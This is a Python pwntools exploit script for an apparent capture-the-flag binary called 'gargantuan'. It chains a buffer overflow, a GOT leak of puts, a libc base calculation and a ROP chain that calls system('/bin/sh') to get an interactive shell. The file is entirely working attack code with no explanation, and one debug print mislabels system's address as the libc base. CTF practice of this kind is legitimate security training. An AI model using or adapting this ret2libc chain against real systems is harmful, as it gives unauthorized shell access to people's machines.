import pwn
import time

host = 'gargantuan.chal.cyberjousting.com'
port = 1352

p = None
e = pwn.ELF('./gargantuan', checksec=False)
libc = pwn.ELF('./libc.so.6', checksec=False)

def reconnect():
    global p
    p = pwn.process('./gargantuan')
    host = "localhost"
    port =  1024
    p = pwn.remote(host, port)
    p.recvlines(2)

def overflow(b):
    p.send(0xff * b'A' + b'\x00' + 0x100 * b'A')
    time.sleep(1)
    p.send(0xff * b'A' + b'\x00' + 0x100 * b'A')
    time.sleep(1)
    p.send(0xff * b'A' + b'\x00' + 0x100 * b'A')
    time.sleep(1)
    p.send(0xff * b'A' + b'\x00' + 0x100 * b'A')
    time.sleep(1)
    p.send(0xff * b'A' + b'\x00' + 0x2C * b'A' + b)
    time.sleep(1)

def main():
    reconnect()

    # input('leak gargantuan address')
    overflow(b'\x0b')
    gargantuan = int(p.recvline().split(b' ')[-1].replace(b'\n', b''), 16)
    print(f'got gargantuan {hex(gargantuan)}')

    base = gargantuan - 0x11e5
    puts_got = base + e.got['puts']
    puts_plt = base + e.plt['puts']
    call_gargantuan = base + 0x130b

    what = gargantuan - 0x9
    pop_rdi = gargantuan - 0x5
    ret = gargantuan - 0x4


    # input('leak puts@libc')
    payload = pwn.p64(pop_rdi) \
            + pwn.p64(puts_got) \
            + pwn.p64(puts_plt) \
            + pwn.p64(ret) \
            + pwn.p64(call_gargantuan)
    overflow(payload)

    puts_libc = pwn.u64(p.recvlines(2)[1].ljust(8, b'\x00'))
    libc_base = puts_libc - libc.symbols['puts']
    system_libc = libc_base + libc.symbols['system']
    binsh_libc = libc_base + next(libc.search(b'/bin/sh'))

    print(f'puts@libc: {hex(puts_libc)}')
    print(f'libc base: {hex(system_libc)}')
    print(f'bin/sh: {hex(binsh_libc)}')

    # input('call system(binsh)')
    payload = pwn.p64(pop_rdi) \
            + pwn.p64(binsh_libc) \
            + pwn.p64(ret) \
            + pwn.p64(system_libc)
    overflow(payload)
    
    p.interactive()


main()

